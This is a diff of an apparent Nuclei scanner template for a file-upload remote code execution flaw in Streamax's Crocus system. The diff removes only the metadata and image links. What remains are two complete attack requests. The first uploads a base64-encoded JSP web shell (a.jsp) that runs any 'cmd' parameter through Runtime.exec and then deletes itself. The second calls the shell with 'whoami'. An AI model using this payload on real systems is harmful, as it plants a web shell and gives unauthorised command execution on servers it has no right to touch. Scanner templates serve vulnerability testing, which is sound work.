@@ -3,15 +3,11 @@ info:
   name: 锐明技术Crocus系统 imageupload 文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cnctdq66plmfh6bc'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cnctdq66plmfh6bc
-    fofa: body="/ThirdResource/respond/respond.min.js" && title="Crocus"
 http:
 - raw:
-  - "POST /RepairRecord.do?Action=imageupload HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: close\n\n{\n  \"username\": \"streamax20020818\",\n  \"license\": \"1\",\n  \"chnnel\": 1,\n  \"type\": 1,\n  \"imsage\": \"PCUgamF2YS5pby5JbnB1dFN0cmVhbSBpbiA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKS5nZXRJbnB1dFN0cmVhbSgpO2ludCBhID0gLTE7Ynl0ZVtdIGIgPSBuZXcgYnl0ZVsyMDQ4XTtvdXQucHJpbnQoIjxwcmU+Iik7d2hpbGUoKGE9aW4ucmVhZChiKSkhPS0xKXtvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIsMCxhKSk7fW91dC5wcmludCgiPC9wcmU+Iik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg==\",\n  \"picturename\": \"a.jsp\"\n}\n回显必须是true\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754121836026-f2b980c9-0a65-4ee6-bee7-7d25a64bd95f.png)"
+  - "POST /RepairRecord.do?Action=imageupload HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: close\n\n{\n  \"username\": \"streamax20020818\",\n  \"license\": \"1\",\n  \"chnnel\": 1,\n  \"type\": 1,\n  \"imsage\": \"PCUgamF2YS5pby5JbnB1dFN0cmVhbSBpbiA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKS5nZXRJbnB1dFN0cmVhbSgpO2ludCBhID0gLTE7Ynl0ZVtdIGIgPSBuZXcgYnl0ZVsyMDQ4XTtvdXQucHJpbnQoIjxwcmU+Iik7d2hpbGUoKGE9aW4ucmVhZChiKSkhPS0xKXtvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIsMCxhKSk7fW91dC5wcmludCgiPC9wcmU+Iik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg==\",\n  \"picturename\": \"a.jsp\"\n}\n回显必须是true"
   redirects: false
   matchers:
   - status:
@@ -20,9 +16,7 @@ http:
 - raw:
   - 'GET /SystemFile/PictureRecord/imageupload/a.jsp?cmd=whoami HTTP/1.1
 
-    Host: {{Hostname}}
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754121836299-5aa93dfc-c704-4fe4-aee4-d89a03196dc5.png)'
+    Host: {{Hostname}}'
   redirects: false
   matchers:
   - status:
